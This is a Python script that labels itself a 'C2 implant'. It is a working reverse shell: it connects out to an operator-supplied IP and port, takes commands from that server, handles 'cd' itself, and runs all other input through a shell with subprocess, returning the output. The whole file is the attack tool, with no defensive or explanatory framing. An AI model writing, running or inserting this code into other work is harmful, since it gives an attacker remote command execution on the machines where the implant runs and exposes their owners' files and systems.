import socket
import subprocess
import os
import argparse

parser = argparse.ArgumentParser(description='C2 implant ')
parser.add_argument('-ip', type=str, required=True, help='Input the remote IP  ')
parser.add_argument('-p', type=int, required=True, help='Input the remote port ')

args = parser.parse_args()


def inbound_comm():
    print(f'[+] Awaiting response from server...')
    message = ''
    while True:
        try: 
            message = sock.recv(1024).decode()
            return message
        except Exception:
            print(f'[-] An exception occured')
            sock.close()

def outbound_comm(message):
    response = str(message).encode()
    sock.send(response)

def session_handler():
    print(f'[+] Trying to connect to {host_ip}')
    sock.connect((host_ip,host_port))
    print(f'[+] Connected to {host_ip}')

    while True:
        message = inbound_comm()
        print(message)
        if message == 'exit':
            print('[-] The server terminated the session...')
            sock.close()
            break
        
        elif message.split(" ")[0] == 'cd': #split message on space and see if index 0 == cd
            directory = str(message.split(" ")[1])
            os.chdir(directory)
            cur_dir = os.getcwd()
            print(f'[+] Changed dir to {cur_dir}')
            sock.send(cur_dir.encode())
        else:
            #subprocess shell handling
            command = subprocess.Popen(message, shell=True, stdout =subprocess.PIPE, stderr=subprocess.PIPE)
            output = command.stdout.read() + command.stderr.read()
            outbound_comm(output.decode())          
                
      

if __name__ == '__main__':
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    host_ip = args.ip
    host_port = args.p
    session_handler()


